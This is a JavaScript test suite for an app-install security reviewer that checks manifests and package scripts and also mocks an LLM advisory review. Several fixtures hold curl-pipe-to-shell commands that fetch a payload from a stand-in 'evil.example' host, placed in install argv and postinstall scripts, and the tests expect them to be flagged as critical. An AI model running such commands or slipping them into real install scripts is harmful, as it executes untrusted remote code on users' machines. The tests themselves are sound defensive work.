import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

const Database = require('better-sqlite3');

const VALID_MANIFEST = {
  schemaVersion: 1,
  slug: 'fixture',
  name: 'Fixture',
  publisher: 'tester',
  upstream: { git: 'https://github.com/example/fixture.git', ref: 'v1.0.0' },
  framework: 'vite',
  runtime: { kind: 'node', arch: ['arm64', 'x86_64'], package_manager: 'npm', dependency_strategy: 'frozen' },
  install: [{ argv: ['npm', 'ci'] }],
  start: { argv: ['npm', 'run', 'dev'], port: 'detect', readiness: { type: 'http', path: '/' } },
  surface: { kind: 'web' },
  permissions: {
    network: { outbound: true, inbound: false },
    filesystem: 'app-private',
    os8_capabilities: [],
  },
  legal: { license: 'MIT', commercial_use: 'unrestricted' },
  review: { channel: 'verified' },
};

function clone(o) { return JSON.parse(JSON.stringify(o)); }

function makeStagingDir(parentDir, files = {}) {
  const dir = path.join(parentDir, 'staging');
  fs.mkdirSync(dir, { recursive: true });
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

describe('AppReviewService — static checks', () => {
  let parentDir;
  let AppReviewService;

  beforeEach(() => {
    parentDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os8-rev-'));
    delete require.cache[require.resolve('../src/services/app-review')];
    AppReviewService = require('../src/services/app-review');
  });

  afterEach(() => {
    fs.rmSync(parentDir, { recursive: true, force: true });
  });

  it('valid worldmonitor-shape manifest passes blocking checks', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ name: 'fix', version: '0.0.0', scripts: { dev: 'vite' } }),
      'package-lock.json': '{"lockfileVersion":3}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, VALID_MANIFEST, {
      channel: 'verified',
      resolvedCommit: 'a'.repeat(40),
      hostArch: 'arm64',
    });
    expect(blockers).toEqual([]);
  });

  it('rejects shell:true on start', () => {
    const m = clone(VALID_MANIFEST);
    m.start.shell = true;
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /start\.shell:true/.test(f.description))).toBe(true);
    expect(blockers.every(f => f.severity === 'critical')).toBe(true);
  });

  it('rejects argv that is not an array', () => {
    const m = clone(VALID_MANIFEST);
    m.install = [{ argv: 'npm ci' }];   // string, not array
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /not an argv array/.test(f.description))).toBe(true);
  });

  it('rejects curl|sh in install command argv', () => {
    const m = clone(VALID_MANIFEST);
    m.install = [{ argv: ['sh', '-c', 'curl https://evil.example/payload | sh'] }];
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /shell-pipe/.test(f.description))).toBe(true);
  });

  it('rejects host arch not in manifest.runtime.arch', () => {
    const m = clone(VALID_MANIFEST);
    m.runtime.arch = ['x86_64'];   // explicit mismatch with arm64 host
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /host arch arm64 not in/.test(f.description))).toBe(true);
  });

  it('accepts arch aliases (x64 ↔ x86_64, aarch64 ↔ arm64)', () => {
    const m = clone(VALID_MANIFEST);
    m.runtime.arch = ['arm64'];
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const ok1 = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'aarch64',
    });
    expect(ok1).toEqual([]);

    m.runtime.arch = ['x86_64'];
    const ok2 = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'x64',
    });
    expect(ok2).toEqual([]);
  });

  it('rejects non-SHA resolvedCommit when supplied', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'v1.0.0', hostArch: 'arm64',
    });
    expect(blockers.some(f => /40-char SHA/.test(f.description))).toBe(true);
  });

  it('verified channel without lockfile fails', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /lockfile/.test(f.description))).toBe(true);
  });

  it('verified channel with mismatched declared package_manager fails', () => {
    const m = clone(VALID_MANIFEST);
    m.runtime.package_manager = 'pnpm';
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',     // npm lockfile, but manifest says pnpm
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => /package_manager 'pnpm' declared/.test(f.description))).toBe(true);
  });

  it('flags package.json postinstall as a warning (not blocking by itself)', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: { postinstall: 'echo hi' } }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    // Only warning; install can still proceed.
    const postFinding = blockers.find(f => /postinstall script present/.test(f.description));
    expect(postFinding).toBeDefined();
    expect(postFinding.severity).toBe('warning');
  });

  it('flags curl|sh inside postinstall script as critical', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({
        scripts: { postinstall: 'curl https://evil.example/p | sh' },
      }),
      'package-lock.json': '{}',
    });
    const blockers = AppReviewService._runStaticChecks(stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(blockers.some(f => f.severity === 'critical' && /shell-pipe-to-interpreter/.test(f.description))).toBe(true);
  });

  it('lockfile detection respects pnpm > yarn > bun > npm precedence', () => {
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'pnpm-lock.yaml': '',
      'package-lock.json': '{}',
    });
    const lock = AppReviewService._internal.detectLockfile(stagingDir);
    expect(lock).toEqual({ pm: 'pnpm', file: 'pnpm-lock.yaml' });
  });
});

describe('AppReviewService.review — full pipeline with mocked LLM', () => {
  let parentDir;
  let db;
  let AppReviewService;
  let Shared;
  let runReviewSpy;

  beforeEach(() => {
    parentDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os8-rev-'));
    delete require.cache[require.resolve('../src/services/app-review')];
    delete require.cache[require.resolve('../src/services/security-review-shared')];
    AppReviewService = require('../src/services/app-review');
    Shared = require('../src/services/security-review-shared').Shared;
    runReviewSpy = vi.spyOn(Shared, 'runReview');
    db = new Database(':memory:');
  });

  afterEach(() => {
    runReviewSpy.mockRestore();
    db.close();
    fs.rmSync(parentDir, { recursive: true, force: true });
  });

  it('low-risk LLM result + clean static checks → low riskLevel', async () => {
    runReviewSpy.mockResolvedValue({
      riskLevel: 'low',
      findings: [],
      trustAssessment: { manifestMatchesCode: true, depCount: 5, execScripts: 0 },
      summary: 'looks clean',
    });
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: { dev: 'vite' } }),
      'package-lock.json': '{}',
    });

    const result = await AppReviewService.review(db, stagingDir, VALID_MANIFEST, {
      channel: 'verified',
      resolvedCommit: 'a'.repeat(40),
      hostArch: 'arm64',
    });
    expect(result.riskLevel).toBe('low');
    expect(result.summary).toBe('looks clean');
  });

  it('blocking static check skips the LLM and returns high', async () => {
    runReviewSpy.mockResolvedValue({ riskLevel: 'low', findings: [], summary: '' });
    const m = clone(VALID_MANIFEST);
    m.start.shell = true;
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: {} }),
      'package-lock.json': '{}',
    });

    const result = await AppReviewService.review(db, stagingDir, m, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(result.riskLevel).toBe('high');
    expect(runReviewSpy).not.toHaveBeenCalled();
  });

  it('LLM error surfaces as a medium-risk advisory, never blocks', async () => {
    const { LLMReviewError } = require('../src/services/security-review-shared');
    runReviewSpy.mockRejectedValue(new LLMReviewError('non-JSON: oops'));
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({ scripts: { dev: 'vite' } }),
      'package-lock.json': '{}',
    });

    const result = await AppReviewService.review(db, stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(result.riskLevel).toBe('medium');
    expect(result.summary).toMatch(/LLM review unavailable/);
    expect(result.findings.some(f => /LLM review unavailable/.test(f.description))).toBe(true);
  });

  it('elevates risk when advisory finds a critical (e.g. supply chain)', async () => {
    runReviewSpy.mockResolvedValue({ riskLevel: 'low', findings: [], summary: 'clean' });
    const stagingDir = makeStagingDir(parentDir, {
      'package.json': JSON.stringify({
        scripts: { postinstall: 'curl https://evil.example/p | sh' },
      }),
      'package-lock.json': '{}',
    });

    const result = await AppReviewService.review(db, stagingDir, VALID_MANIFEST, {
      channel: 'verified', resolvedCommit: 'a'.repeat(40), hostArch: 'arm64',
    });
    expect(result.riskLevel).toBe('high');
  });
});

describe('Shared helper parser', () => {
  let Shared;

  beforeEach(() => {
    delete require.cache[require.resolve('../src/services/security-review-shared')];
    Shared = require('../src/services/security-review-shared').Shared;
  });

  it('parses fenced ```json blocks', () => {
    const out = Shared.parseStructuredResponse('```json\n{"a":1}\n```');
    expect(out).toEqual({ a: 1 });
  });

  it('parses bare JSON', () => {
    const out = Shared.parseStructuredResponse('{"a":1}');
    expect(out).toEqual({ a: 1 });
  });

  it('parses JSON inside prose (greedy {...})', () => {
    const out = Shared.parseStructuredResponse('Here you go: {"a":1, "b": [1,2]}');
    expect(out).toEqual({ a: 1, b: [1, 2] });
  });

  it('throws LLMReviewError on malformed body', () => {
    const { LLMReviewError } = require('../src/services/security-review-shared');
    expect(() => Shared.parseStructuredResponse('not even close to json')).toThrow(LLMReviewError);
  });
});
